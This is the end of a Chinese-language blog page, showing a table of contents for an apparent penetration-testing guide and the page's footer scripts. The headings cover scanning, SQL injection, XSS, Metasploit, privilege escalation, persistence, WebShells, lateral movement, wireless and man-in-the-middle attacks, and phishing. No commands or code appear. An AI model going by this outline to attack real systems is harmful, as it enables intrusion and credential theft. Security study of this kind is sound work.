href="#%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">9.1.</span> <span class="toc-text">（一）漏洞数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89Nmap-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">9.2.</span> <span class="toc-text">（二）Nmap 漏洞扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89Nikto-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">9.3.</span> <span class="toc-text">（三）Nikto 漏洞扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89Wapiti-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">9.4.</span> <span class="toc-text">（四）Wapiti 漏洞扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%BA%94%EF%BC%89ZAP-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">9.5.</span> <span class="toc-text">（五）ZAP 漏洞扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E5%85%AD%EF%BC%89xray-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">9.6.</span> <span class="toc-text">（六）xray 漏洞扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%83%EF%BC%89CMS-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">9.7.</span> <span class="toc-text">（七）CMS 漏洞扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">10.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89Web-%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.1.</span> <span class="toc-text">（一）Web 安全漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89Burp-Suite-%E4%BD%BF%E7%94%A8"><span class="toc-number">10.2.</span> <span class="toc-text">（二）Burp Suite 使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">10.3.</span> <span class="toc-text">（三）SQL 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89XSS-%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.4.</span> <span class="toc-text">（四）XSS 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.5.</span> <span class="toc-text">（五）文件包含漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E5%85%AD%EF%BC%89Metasploit-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6"><span class="toc-number">10.6.</span> <span class="toc-text">（六）Metasploit 渗透测试框架</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">11.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80"><span class="toc-number">11.1.</span> <span class="toc-text">提权基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit-%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83"><span class="toc-number">11.2.</span> <span class="toc-text">Metasploit 框架提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PowerShell-%E8%84%9A%E6%9C%AC%E6%8F%90%E6%9D%83"><span class="toc-number">11.3.</span> <span class="toc-text">PowerShell 脚本提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Starkiller-%E5%90%8E%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83"><span class="toc-number">11.4.</span> <span class="toc-text">Starkiller 后渗透框架提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">12.</span> <span class="toc-text">持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit-%E6%A1%86%E6%9E%B6%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">12.1.</span> <span class="toc-text">Metasploit 框架持久化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Starkiller-%E6%A1%86%E6%9E%B6%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">12.2.</span> <span class="toc-text">Starkiller 框架持久化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96%E4%BA%A4%E4%BA%92%E5%BC%8F%E4%BB%A3%E7%90%86"><span class="toc-number">12.3.</span> <span class="toc-text">持久化交互式代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebShell"><span class="toc-number">12.4.</span> <span class="toc-text">WebShell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">13.</span> <span class="toc-text">内网横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">13.1.</span> <span class="toc-text">（一）信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">13.2.</span> <span class="toc-text">（二）横向移动</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">14.</span> <span class="toc-text">暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%93%88%E5%B8%8C"><span class="toc-number">14.1.</span> <span class="toc-text">（一）哈希</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8"><span class="toc-number">14.2.</span> <span class="toc-text">（二）密码字典</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7"><span class="toc-number">14.3.</span> <span class="toc-text">（三）暴力破解工具</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB"><span class="toc-number">15.</span> <span class="toc-text">无线网络攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E6%97%A0%E7%BA%BF%E6%8E%A2%E6%B5%8B"><span class="toc-number">15.1.</span> <span class="toc-text">（一）无线探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E6%9F%A5%E6%89%BE%E9%9A%90%E8%97%8F%E7%9A%84-SSID"><span class="toc-number">15.2.</span> <span class="toc-text">（二）查找隐藏的 SSID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%95%E8%BF%87-MAC-%E5%9C%B0%E5%9D%80%E8%AE%A4%E8%AF%81"><span class="toc-number">15.3.</span> <span class="toc-text">（三）绕过 MAC 地址认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%8D%8F%E8%AE%AE"><span class="toc-number">15.4.</span> <span class="toc-text">（四）无线网络数据加密协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%BA%94%EF%BC%89%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="toc-number">15.5.</span> <span class="toc-text">（五）拒绝服务攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E5%85%AD%EF%BC%89%E5%85%8B%E9%9A%86-AP-%E6%94%BB%E5%87%BB"><span class="toc-number">15.6.</span> <span class="toc-text">（六）克隆 AP 攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%83%EF%BC%89%E6%9E%B6%E8%AE%BE%E9%92%93%E9%B1%BC-AP"><span class="toc-number">15.7.</span> <span class="toc-text">（七）架设钓鱼 AP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E5%85%AB%EF%BC%89%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3"><span class="toc-number">15.8.</span> <span class="toc-text">（八）自动化工具破解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB"><span class="toc-number">16.</span> <span class="toc-text">中间人攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">16.1.</span> <span class="toc-text">（一）攻击原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89Ettercap-%E6%A1%86%E6%9E%B6"><span class="toc-number">16.2.</span> <span class="toc-text">（二）Ettercap 框架</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89Bettercap-%E6%A1%86%E6%9E%B6"><span class="toc-number">16.3.</span> <span class="toc-text">（三）Bettercap 框架</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89arpspoof-%E5%B7%A5%E5%85%B7"><span class="toc-number">16.4.</span> <span class="toc-text">（四）arpspoof 工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%BA%94%EF%BC%89SSL-%E6%94%BB%E5%87%BB"><span class="toc-number">16.5.</span> <span class="toc-text">（五）SSL 攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6"><span class="toc-number">17.</span> <span class="toc-text">社会工程学</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%A6%82%E8%BF%B0"><span class="toc-number">17.1.</span> <span class="toc-text">一、社会工程学概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">17.2.</span> <span class="toc-text">二、社会工程学攻击方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81Social-Engineer-Toolkit%EF%BC%88SET%EF%BC%89"><span class="toc-number">17.3.</span> <span class="toc-text">三、Social - Engineer Toolkit（SET）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E7%AA%83%E5%8F%96%E5%87%AD%E6%8D%AE"><span class="toc-number">17.3.1.</span> <span class="toc-text">（一）窃取凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BD%BF%E7%94%A8%E6%A0%87%E7%AD%BE%E9%92%93%E9%B1%BC%E7%AA%83%E5%8F%96%E5%87%AD%E6%8D%AE"><span class="toc-number">17.3.2.</span> <span class="toc-text">（二）使用标签钓鱼窃取凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89Web-%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB"><span class="toc-number">17.3.3.</span> <span class="toc-text">（三）Web 劫持攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E5%A4%9A%E9%87%8D%E6%94%BB%E5%87%BB%E7%BD%91%E7%BB%9C%E6%96%B9%E6%B3%95"><span class="toc-number">17.3.4.</span> <span class="toc-text">（四）多重攻击网络方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%94%EF%BC%89HTA-%E6%94%BB%E5%87%BB"><span class="toc-number">17.3.5.</span> <span class="toc-text">（五）HTA 攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">17.4.</span> <span class="toc-text">四、钓鱼邮件攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89Gophish-%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE"><span class="toc-number">17.4.1.</span> <span class="toc-text">（一）Gophish 的安装和配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BD%BF%E7%94%A8-Gophish-%E5%8F%91%E8%B5%B7%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">17.4.2.</span> <span class="toc-text">（二）使用 Gophish 发起钓鱼邮件攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SRC%E4%B8%93%E9%A1%B9"><span class="toc-number">18.</span> <span class="toc-text">SRC专项</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/06/%E6%A5%A0%E5%AF%BB%E6%99%BA%E6%85%A7%E7%89%88/" title="楠寻智慧版">楠寻智慧版</a><time datetime="2025-04-06T19:15:00.000Z" title="发表于 2025-04-06 19:15:00">2025-04-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/23/%E6%A5%A0%E5%AF%BB%E6%9D%A5%E6%97%B6%E7%89%88/" title="楠寻来时版">楠寻来时版</a><time datetime="2025-01-23T00:00:00.000Z" title="发表于 2025-01-23 00:00:00">2025-01-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/14/%E6%A5%A0%E5%AF%BB%E7%BD%91%E5%AE%89%E7%89%88/" title="楠寻网安版">楠寻网安版</a><time datetime="2025-01-14T00:00:00.000Z" title="发表于 2025-01-14 00:00:00">2025-01-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/11/%E6%A5%A0%E5%AF%BB%E7%BD%91%E6%96%87%E7%89%88/" title="楠寻网文版">楠寻网文版</a><time datetime="2025-01-11T00:00:00.000Z" title="发表于 2025-01-11 00:00:00">2025-01-11</time></div></div></div></div></div></div></main><footer id="footer" style="background:0 0"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By njmxye</div><div class="framework-info"><span>框架</span> <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题</span> <a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/fancybox/3.5.7/jquery.fancybox.min.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/instant.page/5.1.0/instantpage.min.js" type="module"></script><div class="js-pjax"><script>(()=>{const e=()=>{new Valine(Object.assign({el:"#vcomment",appId:"",appKey:"",avatar:"",serverURLs:"",emojiMaps:"",path:window.location.pathname,visitor:!1},null))},t=async()=>{"function"==typeof Valine||await getScript("https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/valine/1.4.16/Valine.min.js"),e()};setTimeout(t,0)})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginModelPath:"assets/",model:{jsonPath:"/live2dw/assets/koharu.model.json"},display:{position:"right",width:300,height:600},mobile:{show:!1},rect:"opacity:0.7",log:!1,pluginJsPath:"lib/",pluginRootPath:"live2dw/",tagMode:!1})</script></body></html>